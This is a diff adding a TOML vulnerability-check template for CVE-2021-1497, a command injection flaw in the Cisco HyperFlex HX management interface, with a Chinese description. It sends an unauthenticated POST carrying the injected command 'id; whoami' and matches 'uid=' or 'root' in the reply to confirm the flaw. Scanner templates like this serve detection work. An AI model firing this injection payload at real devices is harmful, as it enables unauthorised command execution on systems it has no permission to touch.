@@ -1,0 +1,45 @@
+[info]
+author = "ave"
+description = "Cisco HyperFlex HX 数据平台管理界面存在命令注入漏洞，未认证攻击者可发送特制 HTTP 请求在目标设备上执行任意系统命令，通过注入命令并检测回显来验证漏洞存在"
+id = "POC-AVE-2021-0022"
+name = "CVE-2021-1497 PoC"
+severity = "critical"
+tags = ["ave-2021-0022"]
+vuln_id = [
+    "CVE-2021-1497",
+    "AVE-2021-0022",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/api/v1/platform/cli"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"command": "id; whoami"}'
+type = "json"
+
+[[poc.requests.extractors]]
+group = 1
+name = "command_output"
+part = "body"
+regex = 'uid=(\d+)'
+type = "regex"
+value = 'uid=(\d+)'
+
+[poc.requests.headers]
+Content-Type = "application/json"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "root",
+    "uid=",
+    "whoami",
+]
